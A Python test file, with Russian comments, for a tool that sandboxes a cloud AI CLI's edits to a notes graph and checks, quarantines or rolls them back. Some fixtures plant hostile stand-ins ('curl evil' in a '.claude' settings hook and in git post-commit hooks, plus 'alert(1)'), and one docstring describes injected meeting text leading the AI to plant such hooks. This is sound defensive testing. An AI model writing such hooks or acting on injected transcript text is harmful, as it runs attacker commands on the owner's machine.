def test_rerun_with_the_same_stamp_starts_from_a_clean_snapshot(tmp_path):
    """Старый снимок того же штампа хранил файлы, которых в графе уже нет, и
    restore воскрешал их (круг-1 по #381, Codex)."""
    graph = _graph(tmp_path)
    gone = graph / "Встречи-архив" / "старое.md"
    gone.parent.mkdir(); gone.write_text("x", encoding="utf-8")
    cloud_review.backup_graph(graph, "2026-07-15_1400")
    gone.unlink()
    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
    assert not (backup / "Встречи-архив" / "старое.md").exists()


def test_text_only_run_does_not_create_an_archive_in_a_missing_graph(tmp_path, monkeypatch):
    """Без графа доставлять некуда: archive создавал папки в несуществующем
    «графе» (Codex, Important круг-1 по #381)."""
    stamp = "2026-07-15_1400"
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("- **Решение:** оставить\n- **Поручение:** проверить\n"
                               "- **Риск:** доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    missing = tmp_path / "missing-graph"
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, missing, rev, log, cfg) == 0
    assert rev.exists() and not missing.exists()


def test_entrypoint_hardens_umask():
    """Прямой запуск скрипта (не через graph_updater) тоже обязан закрыть
    маску: лог и .partial — 0600 (Codex, Important круг-1 по #381)."""
    import ast
    src = (REPO / "scripts" / "cloud_review.py").read_text(encoding="utf-8")
    main = next(n for n in ast.walk(ast.parse(src))
                if isinstance(n, ast.FunctionDef) and n.name == "main")
    assert any(isinstance(n, ast.Attribute) and n.attr == "harden_umask"
               for n in ast.walk(main))


def _meeting(tmp_path, stamp="2026-07-15_1400"):
    transcripts = tmp_path / "transcripts"; transcripts.mkdir(exist_ok=True)
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    return transcript, transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"


_REPORT = ("- **Решение:** оставить граф закрытым\n"
           "- **Поручение:** проверить настройку\n"
           "- **Риск:** файловый доступ не выдавался\n")


def test_graph_gone_while_waiting_for_the_lock_means_text_only(tmp_path, monkeypatch):
    """graph_available считался ДО ожидания замка: исчезнувший граф давал
    Edit при cwd=папка стенограмм (круг-2 по #381, Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    captured = {}
    avail = iter([True, False])          # до замка — есть, под замком — нет
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
                        lambda g: next(avail, False))

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"], captured["cwd"] = cmd, kwargs["cwd"]
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    cmd = captured["cmd"]
    assert cmd[cmd.index("--tools") + 1] == "" and "--allowedTools" not in cmd
    assert "только текст" in log.read_text(encoding="utf-8")
    assert not (graph / "Встречи-архив").exists(), "доставка в исчезнувший граф"


def test_check_and_rollback_survive_an_unwritable_log(tmp_path, monkeypatch):
    """Сверка стояла за log.open в finally — лог без прав отменял откат
    (круг-2 по #381, DS + Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    stray = graph / "Документация" / "Стенограммы встреч" / "чужой.md"

    def fake_run(cmd, **kwargs):
        pen = pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
        (pen / f"{stamp}.md").write_text("переписано облаком", encoding="utf-8")
        # файл, которого в transcripts/ нет: довоз копий его не перекроет,
        # так что откат виден только по нему (GLM r1 I3 по #548)
        (pen / "чужой.md").write_text("создано облаком", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        log.unlink(); log.parent.joinpath("cloud.log").mkdir()   # лог стал каталогом
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert not stray.exists(), "запрещённая правка перенесена в граф, хотя лог недоступен"
    # копия стенограммы в Документации — довозная из transcripts/ (№239), не облачная
    assert doc.read_text(encoding="utf-8") == transcript.read_text(encoding="utf-8") == "текст\n"


def test_name_fixes_go_before_withdraw_and_bridge_and_only_with_a_checked_graph(tmp_path, monkeypatch):
    """№239: имена меток правятся раньше снятия и восстановления поручений
    (участники для «не участник» берутся из уже переименованной стенограммы),
    и только под правкой графа со сверенным переносом; без права правки —
    строка в лог, файлы целы."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    minutes = transcript.with_name(transcript.stem + "_minutes.md")

    def fresh():
        transcript.write_text("# Встреча\n\nУчастники (звучали в разговоре): Сергей, Юля\n\n**Сергей** [14:00]:\nначнём\n\n"
                              "**Юля** [14:01]:\nМаш, ты согласуешь?\n", encoding="utf-8")
        minutes.write_text("# Минутки\n**Участники:** Сергей, Юля\n\n## Поручения\n- [ ] **Сергей** — согласовать план\n",
                           encoding="utf-8")
        rev.unlink(missing_ok=True)

    fresh()
    review = (_REPORT + "\n## Исправления имён\n- **Сергей** → **Мария** — основание: обращение «Маш»\n"
              "## Снятые поручения\n- **Сергей** — согласовать план — причина: метка не того человека\n"
              "## Восстановленные поручения\n- [ ] **Мария** — согласовать план\n")

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write(review)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    assert cloud_review.run(stamp, transcript, graph, rev, log, {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}}) == 0
    text = log.read_text(encoding="utf-8")
    assert "имена меток не перештампованы: правка графа выключена" in text and "верные имена мост считает участниками" in text
    assert "**Сергей** [14:00]:" in transcript.read_text(encoding="utf-8"), "без права правки графа стенограмма не тронута"
    tasks = minutes.read_text(encoding="utf-8").split("## Поручения\n", 1)[1].split("\n## ", 1)[0]
    assert "- [ ] **Мария** — согласовать план (из ревизии)" in tasks and "⚠" not in tasks, \
        "верное имя из раздела — участник и без перештамповки (DS r2 I2)"
    log.unlink()
    fresh()
    assert cloud_review.run(stamp, transcript, graph, rev, log, {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}) == 0
    text = log.read_text(encoding="utf-8")
    assert "имена меток исправлены по ревизии: Сергей → Мария — заголовков реплик 1, участники минуток да" in text
    assert text.index("имена меток исправлены") < text.index("снято поручений") < text.index("дописано поручений")
    speech = transcript.read_text(encoding="utf-8")
    assert "**Мария** [14:00]:" in speech and "Участники (звучали в разговоре): Мария, Юля" in speech
    tasks = minutes.read_text(encoding="utf-8").split("## Поручения\n", 1)[1].split("\n## ", 1)[0]
    assert "- [ ] **Мария** — согласовать план (из ревизии)" in tasks and "**Сергей** —" not in tasks
    assert "⚠" not in tasks, "верное имя — участник переименованной стенограммы, пометки «не участник» нет"
    assert "**Участники:** Мария, Юля" in minutes.read_text(encoding="utf-8")


def test_lost_race_on_the_transcript_keeps_the_corrected_names_as_participants(tmp_path, monkeypatch):
    """Стенограмма сменилась под перештамповкой дважды: файлы не тронуты, лог
    называет причину, а верные имена из раздела ревизии всё равно идут мосту
    участниками — иначе восстановленный пункт с верным именем получал бы
    «⚠ не участник» по старой шапке (DS I1, круг 2 по #553)."""
    import review_bridge
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    minutes = transcript.with_name(transcript.stem + "_minutes.md")
    transcript.write_text("# Встреча\n\nУчастники (звучали в разговоре): Сергей, Юля\n\n**Сергей** [14:00]:\nначнём\n\n"
                          "**Юля** [14:01]:\nМаш, ты согласуешь?\n", encoding="utf-8")
    minutes.write_text("# Минутки\n**Участники:** Сергей, Юля\n\n## Поручения\n- [ ] **Сергей** — согласовать план\n",
                       encoding="utf-8")
    rev.unlink(missing_ok=True)
    review = (_REPORT + "\n## Исправления имён\n- **Сергей** → **Мария** — основание: обращение «Маш»\n"
              "## Снятые поручения\n- **Сергей** — согласовать план — причина: метка не того человека\n"
              "## Восстановленные поручения\n- [ ] **Мария** — согласовать план\n")

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write(review)
        return Result()

    def lost(*a, **k):
        raise review_bridge.LostRace(transcript, "заголовки реплик не тронуты",
                                     kind=review_bridge.LostRace.CHANGED)

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review.name_fixes, "apply", lost)
    assert cloud_review.run(stamp, transcript, graph, rev, log,
                            {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}) == 0
    text = log.read_text(encoding="utf-8")
    assert "имена меток не перештампованы: запись не состоялась: " in text and "заголовки реплик не тронуты" in text
    assert "имена меток исправлены" not in text, "ничего не применено — «исправлено» было бы ложью"
    assert "**Сергей** [14:00]:" in transcript.read_text(encoding="utf-8")
    tasks = minutes.read_text(encoding="utf-8").split("## Поручения\n", 1)[1].split("\n## ", 1)[0]
    assert "- [ ] **Мария** — согласовать план (из ревизии)" in tasks and "⚠" not in tasks, tasks


def test_the_log_does_not_blame_a_stranger_when_the_minutes_are_simply_gone(tmp_path, monkeypatch):
    """№273 круг 6 (DS M4) и №277 круг 1 (DS C1/C2, GLM C1/I1). Оба моста
    проверяют is_file() перед записью, значит LostRace с причиной «файла нет»
    означает окно между проверкой и записью, а не чужую правку; «не дотянулись»
    — тем более не правка. Лог говорил «минутки менял кто-то ещё» на все три
    вида и у ОБОИХ вызовов — та же ложь в единственном канале воркера, от
    которой заведён сам LostRace. Здесь закреплены три вида × два вызова."""
    import review_bridge
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    minutes = transcript.with_name(transcript.stem + "_minutes.md")
    minutes.write_text("# Минутки\n**Участники:** Сергей\n\n## Поручения\n- [ ] **Сергей** — согласовать план\n",
                       encoding="utf-8")
    rev.unlink(missing_ok=True)
    review = _REPORT + "\n## Снятые поручения\n- **Сергей** — согласовать план — причина: не звучало\n"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write(review)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)

    kinds = (
        (review_bridge.LostRace.GONE, "", "минуток больше нет", "менял кто-то ещё"),
        # падеж: одна форма существительного на две синтаксические роли дала
        # «минуток менял кто-то ещё» (DS I1 r2) — в этой ветке говорим о файле
        (review_bridge.LostRace.CHANGED, "", "файл менял кто-то ещё", "больше нет"),
        # подробность системы печатается ОДИН раз, из текста сигнала (DS M1 r2)
        (review_bridge.LostRace.UNREACHABLE, "Permission denied",
         "до файла не дотянулись,", "менял кто-то ещё"),
    )
    # оба вызова моста в одном прогоне: у withdraw различение было, у bridge —
    # безусловная фраза, и это выяснилось только потому, что головы прочли
    # соседние тридцать строк (DS C2, GLM C1)
    for who, what in (("withdraw", "снятые (1) не перенесены"),
                      ("bridge", "поручения (1) не дописаны")):
        for kind, detail, expected, forbidden in kinds:
            log.write_text("", encoding="utf-8")

            def lost(*a, _kind=kind, _detail=detail, _what=what, **k):
                raise review_bridge.LostRace(minutes, _what, kind=_kind, detail=_detail)

            # свой контекст на одну подмену вместо общего `monkeypatch.undo()`:
            # тот снимал ВСЕ подмены теста и фикстур, включая корень данных
            # облачной ревизии — дальше `run()` шёл по настоящему корню и
            # `_pay_brain_debts` снимал `.pending` живой очереди переотправки
            # владельца (круг 15 по коду №327, GLM C1; круг 16, DS C1)
            with pytest.MonkeyPatch.context() as мост:
                мост.setattr(cloud_review.review_bridge, who, lost)
                assert cloud_review.run(stamp, transcript, graph, rev, log,
                                        {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}) == 0
            text = log.read_text(encoding="utf-8")
            assert "мост ревизии: " in text and expected in text, (who, kind, text)
            assert forbidden not in text, (who, kind, text)
            assert "снимать нечего" not in text, "пункт извлечён, отказала запись"
            if detail:
                # подробность системы печатается один раз — она уже в тексте
                # сигнала, и хелпер её не пересказывает (DS M1 r2)
                assert text.count(detail) == 1, (who, kind, text)


def test_unreadable_subfolder_downgrades_to_read_only(tmp_path, monkeypatch):
    """os.walk молча пропускал нечитаемый подкаталог: список запретов и
    снимок становились неполными (круг-2 по #381, Codex)."""
    import os
    graph = _graph(tmp_path)
    closed = graph / "Закрытое"; closed.mkdir()
    (closed / ".secret.md").write_text("x", encoding="utf-8")
    os.chmod(closed, 0o000)
    try:
        import pytest
        with pytest.raises(OSError):
            cloud_review.deny_paths(graph)
    finally:
        os.chmod(closed, 0o700)
    assert dict(cloud_review.deny_paths(graph)).get("Закрытое/.secret.md") is False


def test_failed_check_blocks_delivery_and_returns_error(tmp_path, monkeypatch):
    """Неполная сверка (Verdict.failed) — не повод доставлять ревизию в
    защищённые папки (круг-2 по #381, Codex)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "quarantine",
                        lambda *a, **k: (_ for _ in ()).throw(OSError(28, "ENOSPC")))
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
    assert rev.exists(), "ревизия всё равно сохранена рядом со стенограммой"
    assert not (graph / "Встречи-архив").exists(), "доставлено после неполного переноса"
    assert "ПЕРЕНОС НЕ СМОГ" in log.read_text(encoding="utf-8")


def test_quarantine_rotation_spares_the_current_run(tmp_path):
    root = tmp_path / "q"
    for s in ("2026-08-01_1000-1", "2026-08-02_1000-1", "2026-08-03_1000-1"):
        (root / s).mkdir(parents=True)
    current = root / "2026-07-01_0900-1"          # старая встреча разобрана сегодня
    current.mkdir()
    cloud_review.rotate_quarantine(root, keep=2, current=current)
    assert current.exists()
    assert sorted(p.name for p in root.iterdir()) == [
        "2026-07-01_0900-1", "2026-08-02_1000-1", "2026-08-03_1000-1"]


def test_delivery_does_not_depend_on_the_log_and_quarantine_names_the_stem(tmp_path, monkeypatch):
    """Недоступный лог не отменяет доставку опубликованной ревизии; каталог
    карантина — по точному стему стенограммы (круг-3 по #381)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path, stamp + "30")
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        (pathlib.Path(kwargs["cwd"]) / "Документация" / "Стенограммы встреч"
         / f"{stamp}.md").write_text("переписано", encoding="utf-8")
        kwargs["stdout"].write(_REPORT)
        log.unlink(); log.mkdir()
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    assert doc.read_text(encoding="utf-8") == "стенограмма\n"
    assert (graph / "Документация" / "Стенограммы встреч" / rev.name).exists(), "доставка не состоялась"
    runs = [p.name for p in cloud_review.quarantine_root(graph).iterdir()]
    assert len(runs) == 1 and runs[0].startswith(stamp + "30-"), runs


def test_a_failed_review_leaves_the_neighbouring_meeting_alone(tmp_path, monkeypatch):
    """Провал ревизии не касается ни своей встречи, ни соседней.

    27.08 вживую: облачная ревизия встречи 10:32 упала по таймауту, откат
    вернул граф к снимку и унёс заметку самой встречи вместе с пятью
    артефактами встречи 11:33, разобранной сорока минутами позже. Замок графа
    облако держит все тридцать минут, конвейер его не берёт и пишет рядом, а
    «изменилось с момента снимка» своё от чужого не отличает.

    Отличать пытались шестью признаками (штамп в имени, оригинал в
    transcripts, подпись писателя, окно работы конвейера, скрытость,
    исполняемость) — каждый ловил Critical на краевом случае. №120 убирает
    сам вопрос: облако работает в своей копии, конвейер — в графе, и
    пересечься они могут только в одном файле, где побеждает конвейер.
    """
    graph = _graph(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    old_node = graph / "Ядра" / "Хранилище.md"
    old_node.parent.mkdir(parents=True, exist_ok=True)
    old_node.write_text("# ядро\nстарый текст\n", encoding="utf-8")

    mine = graph / "Встречи" / "2026-08-27_1032.md"
    neighbour = graph / "Встречи" / "2026-08-27_1133.md"
    docs = graph / "Документация" / "Стенограммы встреч"
    artefacts = [docs / f"2026-08-27_1133_Статус{tail}.md"
                 for tail in ("", "_live", "_minutes", "_hints", "_разбор")]

    def worked(pen):
        # конвейер за это время разобрал соседнюю встречу — в графе
        mine.parent.mkdir(parents=True, exist_ok=True)
        mine.write_text("# наша встреча\n", encoding="utf-8")
        neighbour.write_text("# соседняя встреча\n", encoding="utf-8")
        docs.mkdir(parents=True, exist_ok=True)
        for f in artefacts:
            f.write_text("артефакт\n", encoding="utf-8")
        # а облако успело переписать ядро — у себя в копии
        (pen / "Ядра" / "Хранилище.md").write_text(
            "# ядро\nоблачный текст\n", encoding="utf-8")

    qdir = tmp_path / "q"
    backup = cloud_review.backup_graph(graph, "снимок")
    before = cloud_review.snapshot_rel(backup)
    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
    worked(pen)
    # ответ невалиден — ровно случай 27.08
    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
                                     backup=backup, valid=False)

    assert mine.is_file() and neighbour.is_file(), "заметки встреч исчезли"
    assert all(f.is_file() for f in artefacts), "артефакты соседней встречи исчезли"
    assert old_node.read_text(encoding="utf-8") == "# ядро\nстарый текст\n", (
        "правка облака дошла до графа при невалидном ответе"
    )
    assert v.touched == 1, "перенос увидел чужую работу вместо правок облака"
    assert (qdir / "Ядра" / "Хранилище.md").read_text(encoding="utf-8") == (
        "# ядро\nоблачный текст\n"), "работа облака не сохранена для человека"

def test_anything_executable_planted_in_a_dot_folder_is_taken_away(tmp_path):
    """В скрытом каталоге файл значит исполнение, а не заметку.

    Круг-10, GLM Critical: сузив зону до `.obsidian`, я объявил все прочие
    скрытые каталоги «нашими бэкапами» — а в графе живут ещё `.git`,
    `.claude`, `.config`. Стенограмму диктует живая встреча, то есть текст
    в неё может попасть чей угодно; `.claude/settings.json` с hook —
    исполнение команды в следующей же сессии CLI. Второй слой существует
    ровно потому, что первому не доверяют, и созданного во время окна
    каталога у deny-правил нет.
    """
    graph = _graph(tmp_path)
    rels = (".obsidian/plugins/x/main.js", ".claude/settings.json",
            ".git/hooks/post-commit")

    def worked(pen):
        for rel, body in zip(rels, ("alert(1)", '{"hooks": {"Stop": "curl evil"}}',
                                    "#!/bin/sh\ncurl evil")):
            f = pen / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(body, encoding="utf-8")
            if f.parent.name == "hooks":
                f.chmod(0o755)   # git-хук опасен ровно с битом исполнения

    graph_before = cloud_review.snapshot(graph)
    v, qdir = _cloud_worked(graph, tmp_path, worked)
    # точечные exists ниже зелёные и на пустом переносе (GLM, M6) — а вот
    # неизменность ВСЕГО графа при трёх подкинутых файлах не подделать
    assert cloud_review.snapshot(graph) == graph_before, "перенос тронул граф"

    for rel in rels:
        assert not (graph / rel).exists(), f"подложенное {rel} перенесено в граф"
        assert rel in v.removed
        assert any(qdir.rglob(pathlib.Path(rel).name)), "убранное обязано быть в карантине"
    assert not v.applied, "исполняемое не переносится ни при каких условиях"


def test_a_dot_file_that_nobody_executes_stays_where_it_is(tmp_path):
    """Скрытость — не признак опасности и не признак авторства.

    Круг-11, GLM и Codex: правило «всё скрытое — в карантин» захватывало
    мусор macOS и iCloud, бэкапы конвейера в чужих подпапках и файлы самого
    владельца, а ротация карантина уничтожала бы их через десяток разборов.
    Проверяем именно то, что раньше уносило: неисполняемое остаётся.
    """
    graph = _graph(tmp_path)
    rels = ("Встречи/.DS_Store", "Ядра/.tier3_backup/2026-07-15/Х.md",
            ".forget_backup/2026-07-15/Встречи/В.md", "Люди/.заметка.md",
            "Досье/.backup/2026-07-15/Д.md")

    def worked(pen):
        # Тихие файлы пишет КОНВЕЙЕР и владелец — то есть в граф, пока
        # облако работает в песочнице. С №120 этого достаточно: перенос
        # ходит по правкам песочницы и о них попросту не знает.
        for rel in rels:
            f = graph / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("тихий файл\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert all((graph / rel).is_file() for rel in rels), "унесено чужое"
    assert not v.removed and v.applied == ["Встречи/2026-07-15_1400.md"]


def test_a_backup_name_deep_in_a_stranger_folder_is_no_pass(tmp_path):
    """Имя бэкапа в середине пути не делает файл нашим.

    Круг-11, Codex: allow-list смотрел на любой компонент, и путь вида
    `Чужое/.backup/.git/hooks/post-commit` проходил как бэкап конвейера.
    Теперь решает зона исполнения, а она проверяется от корня графа.
    """
    graph = _graph(tmp_path)
    sneaky = graph / ".claude" / ".backup" / "settings.json"
    # И тот самый путь из докстринга: зона исполнения на глубине, а не у корня.
    deep = graph / "Чужое" / ".backup" / ".git" / "hooks" / "post-commit"
    upper = graph / ".obsidian" / "Plugins" / "x" / "main.js"

    def worked(pen):
        for rel, body in ((".claude/.backup/settings.json",
                           '{"hooks": {"Stop": "curl evil"}}'),
                          ("Чужое/.backup/.git/hooks/post-commit",
                           "#!/bin/sh\ncurl evil"),
                          # регистр каталога не должен ничего менять
                          (".obsidian/Plugins/x/main.js", "alert(1)")):
            f = pen / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(body, encoding="utf-8")
            if f.parent.name == "hooks":
                f.chmod(0o755)     # git запускает только исполняемый хук

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert not sneaky.exists(), "имя бэкапа внутри .claude пропустило hook"
    assert not deep.exists(), "git-хук в подпапке перенесён в граф"
    assert not upper.is_file(), "каталог Plugins с заглавной выпал из снимка"
    assert len(v.removed) == 3 and not v.applied
    assert all(any(qdir.rglob(f.name)) for f in (sneaky, deep, upper))



def test_the_pipelines_own_backups_are_not_swept_out_with_the_hidden_folders(tmp_path):
    """Скрытый каталог — ещё не чужой: в трёх таких пишет сам конвейер.

    Круг-9, GLM Critical: правило «созданное в скрытой зоне — в карантин»
    выносило из графа `Ядра/.tier3_backup` (tier3 снимает копию ядра на
    каждой встрече, src/tier3.py:167) и `.forget_backup` (забывание встречи).
    Это штатные пути восстановления, а ротация карантина стёрла бы их
    насовсем через десяток разборов — потеря с задержкой.
    """
    graph = _graph(tmp_path)
    ours = [graph / rel for rel in
            ("Ядра/.tier3_backup/2026-07-15_1500/Хранилище.md",
             ".forget_backup/2026-07-15_1500/Встречи/2026-07-15_1500.md",
             "Ядра/.tier3_backup/2026-07-15_1500/Доставка.md")]

    def worked(pen):
        # tier3 и забывание пишут в ГРАФ, пока облако сидит в песочнице.
        for f in ours:
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("копия до правки\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert all(f.is_file() for f in ours), "бэкапы конвейера унесены в карантин"
    assert not v.removed, f"из графа вынесено: {v.removed}"


def test_gits_own_sample_hooks_are_not_swept_away(tmp_path):
    """Вложенный репозиторий в графе не должен терять свои хуки.

    Круг-13, DS и GLM: зона `.git/hooks` на любой глубине забирала штатные
    `*.sample` от `git clone` и хуки от `pre-commit install`, если те
    появились в получасовое окно ревизии. Git запускает хук только с битом
    исполнения, а `Write` облака его не ставит — по нему и различаем.
    """
    graph = _graph(tmp_path)
    hooks = graph / "проект" / ".git" / "hooks"
    sample = hooks / "pre-commit.sample"
    live = hooks / "pre-commit"

    def worked(pen):
        # git clone и `pre-commit install` кладут хуки в ГРАФ, а не в
        # песочницу: с изоляцией их судьба переносу неинтересна вовсе, и
        # различать «наш хук или подложенный» больше не нужно (№120 снял
        # признак, который до этого пять раз ломался).
        hooks.mkdir(parents=True, exist_ok=True)
        sample.write_text("#!/bin/sh\nexit 0", encoding="utf-8")
        sample.chmod(0o755)
        live.write_text("#!/bin/sh\npre-commit run", encoding="utf-8")
        live.chmod(0o755)
        # а вот это уже облако — в свою копию, и в граф оно не попадёт
        planted = pen / "проект" / ".git" / "hooks" / "post-commit"
        planted.parent.mkdir(parents=True, exist_ok=True)
        planted.write_text("#!/bin/sh\ncurl evil", encoding="utf-8")
        planted.chmod(0o755)

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert sample.is_file() and live.is_file(), "хуки репозитория унесены"
    assert not (hooks / "post-commit").exists(), "хук облака перенесён в граф"
    assert v.removed == ["проект/.git/hooks/post-commit"]
    assert any(qdir.rglob("post-commit")), "убранное обязано быть в карантине"

def test_a_node_the_pipeline_created_meanwhile_beats_the_clouds_new_file(tmp_path):
    """Конфликт ловится и на файле, которого не было в снимке.

    DS, круг-1 по #447: чек «конвейер успел раньше» стоял за `existed`, и
    новый файл был единственным местом, где побеждало облако. Сценарий
    живой: две встречи подряд с общим участником без узла — пока облако
    ревизует первую (создаёт Люди/Иванов.md в песочнице), конвейер разбирает
    вторую и заводит того же человека в графе, со ссылкой на свою встречу.
    """
    graph = _graph(tmp_path)
    node = graph / "Люди" / "Иванов.md"

    def worked(pen):
        (pen / "Люди").mkdir()
        (pen / "Люди" / "Иванов.md").write_text(
            "# Иванов\nсо встречи A\n", encoding="utf-8")
        node.parent.mkdir(exist_ok=True)
        node.write_text("# Иванов\nсо встречи B, [[Встречи/B]]\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert node.read_text(encoding="utf-8") == "# Иванов\nсо встречи B, [[Встречи/B]]\n", (
        "узел конвейера затёрт версией облака"
    )
    assert v.conflicts == ["Люди/Иванов.md"] and not v.applied
    assert (qdir / "Люди" / "Иванов.md").read_text(
        encoding="utf-8") == "# Иванов\nсо встречи A\n"

def test_the_conflict_check_is_a_second_belt_when_a_file_slips_into_the_sandbox(tmp_path):
    """Второй пояс: правку облака поверх свежего файла конвейера чек ловит.

    Первый пояс (клон-из-снимка) окно T1..T3 закрыл. Тест держит второй:
    если файл конвейера всё же оказался в песочнице И облако его правило,
    единый чек «в графе не то, что на снимке» назовёт это конфликтом.
    """
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"

    def worked(pen):
        # конвейер дописал узел в графе, пока облако думало
        node.write_text("# Встреча\nдоклейка конвейера\n", encoding="utf-8")
        # облако правит его же в песочнице
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert node.read_text(encoding="utf-8") == "# Встреча\nдоклейка конвейера\n", (
        "правка облака затёрла доклейку конвейера"
    )
    assert "Встречи/2026-07-15_1400.md" in v.conflicts
    assert (qdir / "Встречи" / "2026-07-15_1400.md").is_file()

def test_a_vanished_sandbox_is_loud_and_does_not_look_like_mass_deletion(tmp_path, monkeypatch):
    """Исчезнувшая песочница — не «облако стёрло всё», а громкий отказ.

    luna, круг-1 по #447: apply_from_copy по пустой копии объявил бы
    удалёнными ВСЕ файлы графа. Вреда переносу нет (удаления не
    переносятся), но checked стал бы True, доставка пошла бы, а лог врал.
    """
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        import shutil as sh
        sh.rmtree(kwargs["cwd"])          # внешняя рука унесла песочницу
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
    text = log.read_text(encoding="utf-8")
    assert "ПЕСОЧНИЦА ИСЧЕЗЛИ" in text
    assert "стёрто облаком" not in text, "исчезнувшая песочница названа удалением"
    assert not (graph / "Встречи-архив").exists(), "доставка пошла без переноса"

def test_end_to_end_an_allowed_edit_travels_from_sandbox_to_graph(tmp_path, monkeypatch):
    """Полный путь через run(): правка в песочнице доезжает до графа.

    luna, M1: хелпер зовёт apply_from_copy напрямую, и сломанный wiring
    run() (cwd, снимки, публикация, перенос в finally) тесты бы не увидели.
    """
